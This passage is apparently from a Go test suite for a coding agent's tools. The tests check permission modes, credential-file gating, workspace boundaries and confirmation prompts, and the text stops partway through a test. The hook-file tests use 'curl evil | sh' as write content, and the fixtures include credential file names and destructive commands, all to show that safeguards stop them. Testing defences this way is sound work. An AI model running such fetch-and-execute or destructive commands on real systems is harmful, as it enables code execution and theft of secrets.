package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/MoneyPack/yonderllm/internal/perm"
	"github.com/MoneyPack/yonderllm/internal/session"
	"github.com/MoneyPack/yonderllm/internal/shell"
	"github.com/MoneyPack/yonderllm/internal/workspace"
)

// workspaceDir builds a project for a tool to look at and makes it the working
// directory, because the tools open the workspace themselves rather than
// accepting one. Files are given as a path relative to the directory mapped to
// its contents; parent directories are created as needed.
func workspaceDir(t *testing.T, files map[string]string) {
	t.Helper()

	dir := t.TempDir()
	for name, content := range files {
		path := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatalf("MkdirAll(%q): %v", filepath.Dir(path), err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatalf("WriteFile(%q): %v", path, err)
		}
	}
	t.Chdir(dir)
}

// names lists the tool names a policy yields, which is what the model sees.
func names(tools []session.Tool) []string {
	out := make([]string, 0, len(tools))
	for _, tool := range tools {
		out = append(out, tool.Definition.Name)
	}
	return out
}

// find returns the named tool, failing the test if the policy withheld it.
func find(t *testing.T, tools []session.Tool, name string) session.Tool {
	t.Helper()

	for _, tool := range tools {
		if tool.Definition.Name == name {
			return tool
		}
	}
	t.Fatalf("no tool named %q in %v", name, names(tools))
	return session.Tool{}
}

// asker stands in for the person an interactive interface would put a request
// to. It answers every question the same way and remembers what it was asked,
// because the wording of the question is as much a part of the contract as the
// verdict is: a reader shown too little cannot honestly say yes.
type asker struct {
	answer   bool
	requests []Request
}

// allow builds an asker that approves everything.
func allow() *asker { return &asker{answer: true} }

// refuse builds an asker that approves nothing.
func refuse() *asker { return &asker{answer: false} }

// ask is the [Approver] to hand to For.
func (a *asker) ask(ctx context.Context, req Request) bool {
	a.requests = append(a.requests, req)
	return a.answer
}

// only returns the single request the asker was put, failing the test if it was
// asked a different number of times than once.
func (a *asker) only(t *testing.T) Request {
	t.Helper()

	if len(a.requests) != 1 {
		t.Fatalf("the user was asked %d times, want exactly once", len(a.requests))
	}
	return a.requests[0]
}

// onDisk returns a file's contents from the working directory, which is where
// workspaceDir has pointed the tools.
func onDisk(t *testing.T, name string) string {
	t.Helper()

	data, err := os.ReadFile(filepath.FromSlash(name))
	if err != nil {
		t.Fatalf("reading back %s: %v", name, err)
	}
	return string(data)
}

// run calls a tool and insists it succeed, since most tests are about the text
// a working call produces rather than about failure.
func run(t *testing.T, tool session.Tool, arguments string) string {
	t.Helper()

	out, err := tool.Run(context.Background(), arguments)
	if err != nil {
		t.Fatalf("%s(%s) failed: %v", tool.Definition.Name, arguments, err)
	}
	return out
}

// wantErr calls a tool expecting failure and returns the message, which is the
// text the model will read as the call's result.
func wantErr(t *testing.T, tool session.Tool, arguments string) string {
	t.Helper()

	out, err := tool.Run(context.Background(), arguments)
	if err == nil {
		t.Fatalf("%s(%s) = %q, want an error", tool.Definition.Name, arguments, out)
	}
	return err.Error()
}

// A mode that permits nothing must describe nothing: chat is a conversation
// with a model that cannot touch the machine, and advertising a tool it may
// not use would invite a call that can only be refused. An approver does not
// change this, because what a mode forbids is not the approver's to grant.
func TestForGivesChatNoTools(t *testing.T) {
	if got := For(perm.New(perm.Chat), allow().ask); len(got) != 0 {
		t.Errorf("For(chat) = %v, want no tools", names(got))
	}
}

// Code and agent both allow reading and searching outright, so both get the
// same pair, and in the same order every time: a set that reshuffled between
// calls would churn the prompt and defeat provider-side prompt caching.
func TestForGivesReadAndSearchWhereAllowed(t *testing.T) {
	want := []string{"read_file", "search_files"}
	for _, mode := range []perm.Mode{perm.Code, perm.Agent} {
		got := names(For(perm.New(mode), nil))
		if !slices.Equal(got, want) {
			t.Errorf("For(%s, no approver) = %v, want %v", mode, got, want)
		}
	}
}

// An approver is what turns a gated capability into an offered one. The same
// policy yields a different tool set depending on whether there is anybody to
// ask, which is the specification's rule stated as code: a run with nobody at
// the other end does not get the write. Code and agent differ in what they gate
// rather than in how the gate works, so each mode's full set is spelled out.
func TestForOffersGatedToolsOnlyWithAnApprover(t *testing.T) {
	wanted := map[perm.Mode][]string{
		perm.Code:  {"read_file", "search_files", "write_file"},
		perm.Agent: {"read_file", "search_files", "write_file", "run_command"},
	}
	for _, mode := range []perm.Mode{perm.Code, perm.Agent} {
		policy := perm.New(mode)

		withoutApprover := names(For(policy, nil))
		for _, gated := range []string{"write_file", "run_command"} {
			if slices.Contains(withoutApprover, gated) {
				t.Errorf("For(%s, no approver) = %v, want no %s", mode, withoutApprover, gated)
			}
		}

		want := wanted[mode]
		got := names(For(policy, allow().ask))
		if !slices.Equal(got, want) {
			t.Errorf("For(%s, approver) = %v, want %v", mode, got, want)
		}
	}
}

// Code proposes patches but never starts a process, which is the whole
// distinction between it and agent. A mode that could run a command while
// claiming not to would make the choice between the two meaningless.
func TestForWithholdsRunningFromCodeMode(t *testing.T) {
	got := names(For(perm.New(perm.Code), allow().ask))
	if slices.Contains(got, "run_command") {
		t.Errorf("For(code, approver) = %v, want no run_command", got)
	}
}

// Auto-approval is the one case where the policy has already answered, so the
// write is offered with no approver at all. Withholding it there would make
// the setting meaningless: a script that opted in would find the capability it
// asked for missing.
func TestForOffersWritingUnderAutoApprovalWithoutAnApprover(t *testing.T) {
	got := names(For(perm.NewAutoApprove(perm.Agent), nil))
	if !slices.Contains(got, "write_file") {
		t.Errorf("For(auto-approved agent, no approver) = %v, want write_file", got)
	}
	if !slices.Contains(got, "run_command") {
		t.Errorf("For(auto-approved agent, no approver) = %v, want run_command", got)
	}
}

// Every schema handed to a provider must be valid JSON describing an object,
// because a malformed one is rejected by the API for the whole request rather
// than for the offending tool, taking the reply down with it.
func TestToolSchemasAreWellFormed(t *testing.T) {
	for _, tool := range For(perm.New(perm.Agent), allow().ask) {
		var schema struct {
			Type       string                     `json:"type"`
			Properties map[string]json.RawMessage `json:"properties"`
			Required   []string                   `json:"required"`
		}
		if err := json.Unmarshal(tool.Definition.Parameters, &schema); err != nil {
			t.Errorf("%s parameters are not valid JSON: %v", tool.Definition.Name, err)
			continue
		}
		if schema.Type != "object" {
			t.Errorf("%s schema type = %q, want %q", tool.Definition.Name, schema.Type, "object")
		}
		if len(schema.Required) == 0 {
			t.Errorf("%s schema requires nothing, want a required argument", tool.Definition.Name)
		}
		for _, field := range schema.Required {
			if _, ok := schema.Properties[field]; !ok {
				t.Errorf("%s requires %q but does not describe it", tool.Definition.Name, field)
			}
		}
		if tool.Definition.Description == "" {
			t.Errorf("%s has no description", tool.Definition.Name)
		}
	}
}

// A read names the file above its contents, because the result reaches the
// model detached from the call that asked for it.
func TestReadFileReturnsTheFileUnderItsPath(t *testing.T) {
	workspaceDir(t, map[string]string{
		"internal/perm/perm.go": "package perm\n\nconst answer = 42\n",
	})

	tool := find(t, For(perm.New(perm.Code), nil), "read_file")
	got := run(t, tool, `{"path": "internal/perm/perm.go"}`)

	want := "internal/perm/perm.go\npackage perm\n\nconst answer = 42"
	if got != want {
		t.Errorf("read_file = %q, want %q", got, want)
	}
}

// An empty file is a fact about the project, so it is stated rather than
// returned as a blank result the model would have to interpret.
func TestReadFileReportsAnEmptyFile(t *testing.T) {
	workspaceDir(t, map[string]string{"TODO.md": ""})

	tool := find(t, For(perm.New(perm.Code), nil), "read_file")
	got := run(t, tool, `{"path": "TODO.md"}`)

	want := "TODO.md\n(empty file)"
	if got != want {
		t.Errorf("read_file = %q, want %q", got, want)
	}
}

// A file too big for one result is cut at a line boundary and the loss is
// declared, so the model can narrow its next request instead of reasoning from
// a fragment it believes is whole.
func TestReadFileClipsALongFileAndSaysSo(t *testing.T) {
	const lines = 2000
	var b strings.Builder
	for i := range lines {
		fmt.Fprintf(&b, "line %d of the very long file\n", i)
	}
	workspaceDir(t, map[string]string{"long.txt": b.String()})

	tool := find(t, For(perm.New(perm.Code), nil), "read_file")
	got := run(t, tool, `{"path": "long.txt"}`)

	if len(got) > maxResultBytes+200 {
		t.Errorf("read_file returned %d bytes, want about %d", len(got), maxResultBytes)
	}
	if !strings.Contains(got, "more lines were not included") {
		t.Errorf("read_file = %q, want a note that lines were dropped", got)
	}
	if strings.Contains(got, "line 1999 of") {
		t.Error("read_file kept the last line, want the tail dropped")
	}
	if !strings.Contains(got, "line 0 of the very long file") {
		t.Error("read_file dropped the first line, want the head kept")
	}
}

// A path outside the project is refused by the workspace, and the refusal is
// passed back as the result so the model learns the boundary exists.
func TestReadFileRefusesAnEscapingPath(t *testing.T) {
	workspaceDir(t, map[string]string{"main.go": "package main\n"})

	tool := find(t, For(perm.New(perm.Code), nil), "read_file")
	got := wantErr(t, tool, `{"path": "../secrets.txt"}`)

	if !strings.Contains(got, "outside the workspace") {
		t.Errorf("read_file error = %q, want it to mention the workspace boundary", got)
	}
}

// A missing file is reported plainly rather than as an opaque syscall error,
// because the model reads this message and may retry with a better path.
func TestReadFileReportsAMissingFile(t *testing.T) {
	workspaceDir(t, map[string]string{"main.go": "package main\n"})

	tool := find(t, For(perm.New(perm.Code), nil), "read_file")
	got := wantErr(t, tool, `{"path": "nope.go"}`)

	if !strings.Contains(got, "no file named") {
		t.Errorf("read_file error = %q, want it to say the file is missing", got)
	}
}

// Code mode proposes patches and has no use for a key, so a file named like a
// credential is refused outright, with a reason the model can act on. Nothing
// is asked: an approver in code mode is there for writes, and the mode's
// answer to this question is no.
func TestReadFileRefusesACredentialFileInCodeMode(t *testing.T) {
	workspaceDir(t, map[string]string{
		".env":               "API_KEY=hunter2\n",
		"id_rsa":             "-----BEGIN OPENSSH PRIVATE KEY-----\n",
		"certs/server.pem":   "-----BEGIN PRIVATE KEY-----\n",
		".netrc":             "machine x login y password z\n",
		".aws/credentials":   "[default]\n",
		"config/secrets.yml": "token: x\n",
	})

	user := allow()
	tool := find(t, For(perm.New(perm.Code), user.ask), "read_file")
	for _, name := range []string{".env", "id_rsa", "certs/server.pem", ".netrc", ".aws/credentials", "config/secrets.yml"} {
		got := wantErr(t, tool, fmt.Sprintf(`{"path": %q}`, name))
		if !strings.Contains(got, "credential") || !strings.Contains(got, "code mode") {
			t.Errorf("read_file(%s) error = %q, want it to name the credential rule and the mode", name, got)
		}
		if strings.Contains(got, "hunter2") {
			t.Errorf("read_file(%s) error = %q, want no file contents", name, got)
		}
	}
	if len(user.requests) != 0 {
		t.Errorf("the user was asked %d times in code mode, want not at all", len(user.requests))
	}
}

// Agent mode puts the read to the reader, with the same insistence a
// destructive command gets: --yes does not waive it. A reader who says yes
// gets the file; one who says no gets a result the model can work with and
// the contents never leave the disk.
func TestReadFileAsksBeforeACredentialFileInAgentMode(t *testing.T) {
	for _, c := range []struct {
		name   string
		policy perm.Policy
	}{
		{"agent", perm.New(perm.Agent)},
		{"agent with auto-approval", perm.NewAutoApprove(perm.Agent)},
	} {
		t.Run(c.name, func(t *testing.T) {
			workspaceDir(t, map[string]string{".env": "API_KEY=hunter2\n"})

			user := allow()
			tool := find(t, For(c.policy, user.ask), "read_file")
			got := run(t, tool, `{"path": ".env"}`)
			if !strings.Contains(got, "hunter2") {
				t.Errorf("read_file = %q, want the contents once approved", got)
			}
			req := user.only(t)
			if req.Action != perm.Read || req.Target != ".env" {
				t.Errorf("request = %s %q, want read %q", req.Action, req.Target, ".env")
			}
			if !strings.Contains(req.Detail, "credential") {
				t.Errorf("request detail = %q, want it to say why the read is being confirmed", req.Detail)
			}

			refuser := refuse()
			tool = find(t, For(c.policy, refuser.ask), "read_file")
			got = run(t, tool, `{"path": ".env"}`)
			if !strings.Contains(got, "refused") || strings.Contains(got, "hunter2") {
				t.Errorf("read_file = %q, want the refusal without the contents", got)
			}
			refuser.only(t)
		})
	}
}

// With nobody to ask, the read cannot happen: a non-interactive agent run
// gets an error naming the file rather than the file. An ordinary read in the
// same run is unaffected, which is what keeps --json runs useful.
func TestReadFileWithoutAnApproverCannotReadACredentialFile(t *testing.T) {
	workspaceDir(t, map[string]string{".env": "API_KEY=hunter2\n", "main.go": "package main\n"})

	tool := find(t, For(perm.NewAutoApprove(perm.Agent), nil), "read_file")
	got := wantErr(t, tool, `{"path": ".env"}`)
	if !strings.Contains(got, "no way to ask the user about .env") {
		t.Errorf("read_file error = %q, want it to say there is nobody to ask", got)
	}
	if !strings.Contains(run(t, tool, `{"path": "main.go"}`), "package main") {
		t.Error("an ordinary read was refused alongside the credential one")
	}
}

// .git is never read, in either mode and however the reader answers: the
// question is asked because the name looks like a credential, and the
// workspace still says no afterwards.
func TestReadFileRefusesGitConfigEvenWhenApproved(t *testing.T) {
	workspaceDir(t, map[string]string{".git/config": "[remote \"origin\"]\n\turl = https://token@example.com/r.git\n"})

	for _, mode := range []perm.Mode{perm.Code, perm.Agent} {
		tool := find(t, For(perm.New(mode), allow().ask), "read_file")
		got := wantErr(t, tool, `{"path": ".git/config"}`)
		if strings.Contains(got, "token@") {
			t.Errorf("read_file in %s mode leaked %q", mode, got)
		}
	}
}

// Search reports how many lines matched and where each one is, so a model can
// go straight to a read without a second search to locate the file.
func TestSearchFilesListsMatchesWithPaths(t *testing.T) {
	workspaceDir(t, map[string]string{
		"a.go": "package a\n\nfunc Answer() int { return 42 }\n",
		"b.go": "package b\n",
	})

	tool := find(t, For(perm.New(perm.Code), nil), "search_files")
	got := run(t, tool, `{"query": "func Answer"}`)

	want := "1 matches for \"func Answer\"\na.go:3: func Answer() int { return 42 }"
	if got != want {
		t.Errorf("search_files = %q, want %q", got, want)
	}
}

// Finding nothing is an answer about the project, not a failure: raised as an
// error it would look like a broken tool and invite a pointless retry.
func TestSearchFilesReportsNoMatchesAsAResult(t *testing.T) {
	workspaceDir(t, map[string]string{"a.go": "package a\n"})

	tool := find(t, For(perm.New(perm.Code), nil), "search_files")
	got := run(t, tool, `{"query": "nowhere"}`)

	want := `no matches for "nowhere"`
	if got != want {
		t.Errorf("search_files = %q, want %q", got, want)
	}
}

// Too many matches to carry are cut at a line boundary with the loss declared,
// pointing the model at the fix that actually works: a narrower query.
func TestSearchFilesClipsManyMatchesAndSaysSo(t *testing.T) {
	var b strings.Builder
	for i := range 400 {
		fmt.Fprintf(&b, "needle %d and a good deal of trailing text to make the line long\n", i)
	}
	workspaceDir(t, map[string]string{"big.txt": b.String()})

	tool := find(t, For(perm.New(perm.Code), nil), "search_files")
	got := run(t, tool, `{"query": "needle"}`)

	if len(got) > maxResultBytes+200 {
		t.Errorf("search_files returned %d bytes, want about %d", len(got), maxResultBytes)
	}
	if !strings.Contains(got, "narrow the query") {
		t.Errorf("search_files = %q, want advice to narrow the query", got)
	}
}

// Arguments are whatever text the model produced, so bad JSON is an ordinary
// outcome. The message names the problem because the model reads it as the
// call's result and can correct itself on the next round.
func TestToolsExplainUnparsableArguments(t *testing.T) {
	workspaceDir(t, map[string]string{"a.go": "package a\n"})

	for _, tool := range For(perm.New(perm.Code), allow().ask) {
		got := wantErr(t, tool, `{"path": `)
		if !strings.Contains(got, "arguments are not valid JSON") {
			t.Errorf("%s error = %q, want it to blame the JSON", tool.Definition.Name, got)
		}
	}
}

// A call with no arguments at all is distinguished from malformed ones,
// because the fix differs: the model must send an object, not repair one.
func TestToolsExplainAbsentArguments(t *testing.T) {
	workspaceDir(t, map[string]string{"a.go": "package a\n"})

	for _, tool := range For(perm.New(perm.Code), allow().ask) {
		for _, arguments := range []string{"", "   "} {
			got := wantErr(t, tool, arguments)
			want := "no arguments were given; send a JSON object"
			if got != want {
				t.Errorf("%s(%q) error = %q, want %q", tool.Definition.Name, arguments, got, want)
			}
		}
	}
}

// A required argument that is missing, empty or only spaces is the same
// mistake, and naming the argument tells the model exactly what to add.
func TestToolsNameAMissingRequiredArgument(t *testing.T) {
	workspaceDir(t, map[string]string{"a.go": "package a\n"})

	cases := []struct {
		tool      string
		field     string
		arguments []string
	}{
		{"read_file", "path", []string{`{}`, `{"path": ""}`, `{"path": "   "}`}},
		{"search_files", "query", []string{`{}`, `{"query": ""}`, `{"query": "   "}`}},
		{"write_file", "path", []string{`{}`, `{"path": "", "content": "x"}`, `{"path": "   ", "content": "x"}`}},
	}

	available := For(perm.New(perm.Code), allow().ask)
	for _, c := range cases {
		tool := find(t, available, c.tool)
		want := fmt.Sprintf("the %q argument is required and must not be empty", c.field)
		for _, arguments := range c.arguments {
			if got := wantErr(t, tool, arguments); got != want {
				t.Errorf("%s(%s) error = %q, want %q", c.tool, arguments, got, want)
			}
		}
	}
}

// A cancelled context stops a tool before it touches the filesystem: the round
// runs after the model has spoken, so if the reader has walked away the
// cheapest correct thing is to do no work at all. Nor is that reader asked to
// approve anything, since a prompt nobody is there to answer would hang the
// call waiting for a verdict that cannot come.
func TestToolsStopBeforeTouchingTheFilesystemWhenCancelled(t *testing.T) {
	workspaceDir(t, map[string]string{"a.go": "package a\n"})

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	user := allow()
	for _, tool := range For(perm.New(perm.Code), user.ask) {
		arguments := `{"path": "a.go", "query": "package", "content": "package a\n"}`
		if _, err := tool.Run(ctx, arguments); err != context.Canceled {
			t.Errorf("%s error = %v, want %v", tool.Definition.Name, err, context.Canceled)
		}
	}
	if len(user.requests) != 0 {
		t.Errorf("the user was asked %d times after cancellation, want not at all", len(user.requests))
	}
}

// The point of the whole slice: an approved write reaches the disk, and the
// result names what happened so the model need not read the file back to learn
// that its own call succeeded.
func TestWriteFileCreatesAFileOnceApproved(t *testing.T) {
	workspaceDir(t, nil)

	user := allow()
	tool := find(t, For(perm.New(perm.Code), user.ask), "write_file")
	got := run(t, tool, `{"path": "internal/cli/run.go", "content": "package cli\n\nfunc Run() {}\n"}`)

	if want := "package cli\n\nfunc Run() {}\n"; onDisk(t, "internal/cli/run.go") != want {
		t.Errorf("internal/cli/run.go = %q, want %q", onDisk(t, "internal/cli/run.go"), want)
	}
	if !strings.Contains(got, "internal/cli/run.go") {
		t.Errorf("write_file = %q, want it to name the file", got)
	}
	if !strings.Contains(got, "3 lines") {
		t.Errorf("write_file = %q, want it to state the size written", got)
	}
	user.only(t)
}

// Overwriting replaces the file entirely rather than appending to it, which is
// what the tool's description promises the model. A write that merged with what
// was there would silently keep code the model meant to delete.
func TestWriteFileReplacesTheWholeFile(t *testing.T) {
	workspaceDir(t, map[string]string{"main.go": "package main\n\nfunc old() {}\n"})

	tool := find(t, For(perm.New(perm.Code), allow().ask), "write_file")
	run(t, tool, `{"path": "main.go", "content": "package main\n"}`)

	if got, want := onDisk(t, "main.go"), "package main\n"; got != want {
		t.Errorf("main.go = %q, want %q", got, want)
	}
}

// A refusal is an answer, not a failure. It comes back as an ordinary result so
// the model can propose something else, and the file it wanted to change is
// exactly as it was.
func TestWriteFileLeavesTheFileAloneWhenRefused(t *testing.T) {
	const before = "package main\n\nfunc keep() {}\n"
	workspaceDir(t, map[string]string{"main.go": before})

	user := refuse()
	tool := find(t, For(perm.New(perm.Code), user.ask), "write_file")

	got, err := tool.Run(context.Background(), `{"path": "main.go", "content": "package main\n"}`)
	if err != nil {
		t.Fatalf("a refused write failed with %v, want the refusal as a result", err)
	}
	if !strings.Contains(got, "refused") {
		t.Errorf("write_file = %q, want it to say the user refused", got)
	}
	if !strings.Contains(got, "main.go") {
		t.Errorf("write_file = %q, want it to name the file", got)
	}
	if onDisk(t, "main.go") != before {
		t.Errorf("main.go = %q, want it unchanged as %q", onDisk(t, "main.go"), before)
	}
	user.only(t)
}

// What the reader is shown is as much the contract as whether they were asked.
// A question that named a path and a byte count would be unanswerable, so an
// edit is put as a diff against what is on disk.
func TestWriteFileAsksWithADiffOfTheChange(t *testing.T) {
	workspaceDir(t, map[string]string{"main.go": "package main\n\nfunc old() {}\n"})

	user := allow()
	tool := find(t, For(perm.New(perm.Code), user.ask), "write_file")
	run(t, tool, `{"path": "main.go", "content": "package main\n\nfunc new() {}\n"}`)

	req := user.only(t)
	if req.Action != perm.Write {
		t.Errorf("request action = %s, want %s", req.Action, perm.Write)
	}
	if req.Target != "main.go" {
		t.Errorf("request target = %q, want %q", req.Target, "main.go")
	}
	if !strings.Contains(req.Detail, "-func old() {}") {
		t.Errorf("request detail = %q, want the removed line", req.Detail)
	}
	if !strings.Contains(req.Detail, "+func new() {}") {
		t.Errorf("request detail = %q, want the added line", req.Detail)
	}
}

// A new file has nothing to diff against, so the question says so outright: a
// reader shown a wall of added lines cannot tell creation from a rewrite that
// destroys everything already there.
func TestWriteFileAsksDifferentlyForANewFile(t *testing.T) {
	workspaceDir(t, nil)

	user := allow()
	tool := find(t, For(perm.New(perm.Code), user.ask), "write_file")
	run(t, tool, `{"path": "notes.md", "content": "x"}`)

	req := user.only(t)
	if !strings.Contains(req.Detail, "does not exist yet") {
		t.Errorf("request detail = %q, want it to say the file is new", req.Detail)
	}
}

// Auto-approval is the policy having answered already, so no question is put.
// Prompting anyway would make the setting a lie to the script that opted in.
func TestWriteFileDoesNotAskUnderAutoApproval(t *testing.T) {
	workspaceDir(t, nil)

	user := refuse()
	tool := find(t, For(perm.NewAutoApprove(perm.Agent), user.ask), "write_file")
	run(t, tool, `{"path": "notes.md", "content": "hello\n"}`)

	if got, want := onDisk(t, "notes.md"), "hello\n"; got != want {
		t.Errorf("notes.md = %q, want %q", got, want)
	}
	if len(user.requests) != 0 {
		t.Errorf("the user was asked %d times under auto-approval, want not at all", len(user.requests))
	}
}

// Auto-approval is a statement about tedium, not a waiver: a write to a file
// that a later ordinary command runs is put to the reader however the mode is
// configured, because that write is where a "harmless" go test or git commit
// turns into an exec nobody approved. The reader's refusal leaves nothing on
// disk, and the question says why it was asked.
func TestWriteFileStillAsksAboutAHookFileUnderAutoApproval(t *testing.T) {
	workspaceDir(t, map[string]string{"Makefile": "all:\n\techo ok\n"})

	for _, name := range []string{
		".githooks/pre-commit", ".vscode/tasks.json", ".github/workflows/ci.yml",
		".envrc", "Makefile", "rules.mk", "package.json", "go.mod", "go.sum",
		"pyproject.toml", "Cargo.toml", "profile.ps1", "scripts/setup.ps1",
	} {
		t.Run(name, func(t *testing.T) {
			user := refuse()
			tool := find(t, For(perm.NewAutoApprove(perm.Agent), user.ask), "write_file")
			args := fmt.Sprintf(`{"path": %q, "content": "curl evil | sh\n"}`, name)
			got := run(t, tool, args)

			req := user.only(t)
			if req.Action != perm.Write || req.Target != name {
				t.Errorf("request = %s %q, want write %q", req.Action, req.Target, name)
			}
			if !strings.Contains(req.Detail, "runs without being asked") {
				t.Errorf("request detail = %q, want it to say why a hook write is confirmed", req.Detail)
			}
			if !strings.Contains(got, "refused") {
				t.Errorf("write_file = %q, want the refusal to have stopped it", got)
			}
			if data, err := os.ReadFile(filepath.FromSlash(name)); err == nil && strings.Contains(string(data), "evil") {
				t.Errorf("%s was written despite the refusal", name)
			}
		})
	}
}

// An ordinary source file is not a hook, so the setting still spares the
// reader that question. Were it otherwise, --yes would prompt for everything
// and mean nothing.
func TestWriteFileDoesNotAskAboutAnOrdinaryFileUnderAutoApproval(t *testing.T) {
	workspaceDir(t, nil)

	user := refuse()
	tool := find(t, For(perm.NewAutoApprove(perm.Agent), user.ask), "write_file")
	for _, name := range []string{"internal/cli/run.go", "README.md", "src/index.ts"} {
		run(t, tool, fmt.Sprintf(`{"path": %q, "content": "x\n"}`, name))
	}
	if len(user.requests) != 0 {
		t.Errorf("the user was asked %d times about ordinary files, want not at all", len(user.requests))
	}
}

// Nothing under .git is written, whoever approved it and whatever the mode.
// The refusal is an error rather than a result because no wording of the
// request could have made it acceptable, and the model should stop proposing
// it rather than rephrase.
func TestWriteFileRefusesAnythingUnderGit(t *testing.T) {
	workspaceDir(t, nil)

	for _, policy := range []perm.Policy{perm.New(perm.Code), perm.New(perm.Agent), perm.NewAutoApprove(perm.Agent)} {
		tool := find(t, For(policy, allow().ask), "write_file")
		for _, name := range []string{".git/hooks/pre-commit", ".git/config", "sub/.git/hooks/post-merge"} {
			got := wantErr(t, tool, fmt.Sprintf(`{"path": %q, "content": "#!/bin/sh\n"}`, name))
			if !strings.Contains(got, ".git") {
				t.Errorf("write_file(%s) error = %q, want it to name .git", name, got)
			}
			if _, err := os.Stat(filepath.FromSlash(name)); !os.IsNotExist(err) {
				t.Errorf("%s exists after a refused write: %v", name, err)
			}
		}
	}
}

// The workspace boundary holds regardless of who approved what: consent to
// write a path is not consent to leave the project, and the refusal reaches the
// model so it learns the edge exists.
func TestWriteFileRefusesAnEscapingPath(t *testing.T) {
	workspaceDir(t, map[string]string{"main.go": "package main\n"})

	tool := find(t, For(perm.New(perm.Code), allow().ask), "write_file")
	got := wantErr(t, tool, `{"path": "../escaped.txt", "content": "x"}`)

	if !strings.Contains(got, "outside the workspace") {
		t.Errorf("write_file error = %q, want it to mention the workspace boundary", got)
	}
}

// The point of the exec slice: an approved command runs in the project and its
// output comes back, with the exit status stated even on success so a command
// that printed nothing is not mistaken for one that failed silently.
func TestRunCommandReturnsOutputOnceApproved(t *testing.T) {
	workspaceDir(t, nil)

	user := allow()
	tool := find(t, For(perm.New(perm.Agent), user.ask), "run_command")
	got := run(t, tool, `{"command": ["go", "env", "GOOS"]}`)

	if !strings.Contains(got, runtime.GOOS) {
		t.Errorf("run_command = %q, want it to carry the output %q", got, runtime.GOOS)
	}
	if !strings.Contains(got, "exit status 0") {
		t.Errorf("run_command = %q, want it to state the exit status", got)
	}
	if !strings.Contains(got, "go env GOOS") {
		t.Errorf("run_command = %q, want it to repeat the command", got)
	}
	user.only(t)
}

// A command that fails has still run, so its exit status is a result and not an
// error: the model asked what happens and the answer is that it exited two.
// Reporting it as a failure of the call would tell the model its own tooling is
// broken when the truth is that the tests it ran did not pass.
func TestRunCommandReportsAFailureAsAResult(t *testing.T) {
	workspaceDir(t, nil)

	tool := find(t, For(perm.New(perm.Agent), allow().ask), "run_command")
	got := run(t, tool, `{"command": ["go", "help", "bogus-topic"]}`)

	if !strings.Contains(got, "exit status 2") {
		t.Errorf("run_command = %q, want the exit status of the failure", got)
	}
	if !strings.Contains(got, "unknown help topic") {
		t.Errorf("run_command = %q, want what the command printed", got)
	}
}

// A refusal is an answer here too. Nothing is started, and the result says so
// plainly rather than looking like a command that ran and produced nothing.
func TestRunCommandRunsNothingWhenRefused(t *testing.T) {
	workspaceDir(t, nil)

	user := refuse()
	tool := find(t, For(perm.New(perm.Agent), user.ask), "run_command")

	got, err := tool.Run(context.Background(), `{"command": ["go", "env", "GOOS"]}`)
	if err != nil {
		t.Fatalf("a refused command failed with %v, want the refusal as a result", err)
	}
	if !strings.Contains(got, "refused") {
		t.Errorf("run_command = %q, want it to say the user refused", got)
	}
	if !strings.Contains(got, "go") {
		t.Errorf("run_command = %q, want it to name the program", got)
	}
	if strings.Contains(got, "exit status") {
		t.Errorf("run_command = %q, want no sign that anything ran", got)
	}
	user.only(t)
}

// The vector the model wrote is the vector the reader judges, argument for
// argument. An argument holding a space is shown quoted, because approving
// go run "my file.go" is a different decision from approving two separate
// arguments, and a prompt that blurred them would be worse than none.
func TestRunCommandAsksWithTheExactArgumentVector(t *testing.T) {
	workspaceDir(t, nil)

	user := refuse()
	tool := find(t, For(perm.New(perm.Agent), user.ask), "run_command")
	run(t, tool, `{"command": ["go", "run", "my file.go"]}`)

	req := user.only(t)
	if req.Action != perm.Exec {
		t.Errorf("request action = %s, want %s", req.Action, perm.Exec)
	}
	if req.Target != "go" {
		t.Errorf("request target = %q, want %q", req.Target, "go")
	}
	if want := `go run "my file.go"`; req.Detail != want {
		t.Errorf("request detail = %q, want %q", req.Detail, want)
	}
}

// Auto-approval spares the reader the tedious commands, so a harmless one runs
// unasked; prompting anyway would make the setting a lie to whoever opted in.
func TestRunCommandDoesNotAskAboutAHarmlessCommandUnderAutoApproval(t *testing.T) {
	workspaceDir(t, nil)

	user := refuse()
	tool := find(t, For(perm.NewAutoApprove(perm.Agent), user.ask), "run_command")
	got := run(t, tool, `{"command": ["go", "env", "GOOS"]}`)

	if !strings.Contains(got, runtime.GOOS) {
		t.Errorf("run_command = %q, want the command to have run", got)
	}
	if len(user.requests) != 0 {
		t.Errorf("the user was asked %d times under auto-approval, want not at all", len(user.requests))
	}
}

// Auto-approval is a statement about tedium, not a waiver of anything
// irreversible: a destructive command is put to the reader however the mode is
// configured, and their refusal stops it.
func TestRunCommandStillAsksAboutADestructiveCommandUnderAutoApproval(t *testing.T) {
	workspaceDir(t, nil)

	user := refuse()
	tool := find(t, For(perm.NewAutoApprove(perm.Agent), user.ask), "run_command")
	got := run(t, tool, `{"command": ["git", "push", "--force"]}`)

	req := user.only(t)
	if req.Target != "git" {
		t.Errorf("request target = %q, want %q", req.Target, "git")
	}
	if !strings.Contains(got, "refused") {
		t.Errorf("run_command = %q, want the refusal to have stopped it", got)
	}
}

// An interpreter is confirmed under auto-approval whatever follows it, because
// the dangerous part of `sh -c "rm -rf ."` is inside a string the tables never
// see. The reader's refusal means nothing was started.
func TestRunCommandStillAsksAboutAnInterpreterUnderAutoApproval(t *testing.T) {
	workspaceDir(t, nil)

	for _, command := range [][]string{
		{"sh", "-c", "true"},
		{"bash", "x.sh"},
		{"cmd", "/c", "dir"},
		{"powershell", "-Command", "Get-Date"},
		{"python", "-c", "print(1)"},
		{"node", "-e", "1"},
		{"xargs", "echo"},
		{"find", ".", "-exec", "echo", "{}", ";"},
		{"git", "branch", "-D", "topic"},
		{"rm.cmd", "x"},
	} {
		user := refuse()
		tool := find(t, For(perm.NewAutoApprove(perm.Agent), user.ask), "run_command")
		args, err := json.Marshal(map[string]any{"command": command})
		if err != nil {
			t.Fatal(err)
		}
		got := run(t, tool, string(args))

		if len(user.requests) != 1 {
			t.Errorf("run_command(%q) asked %d times under auto-approval, want once", command, len(user.requests))
			continue
		}
		if !strings.Contains(got, "refused") || strings.Contains(got, "exit status") {
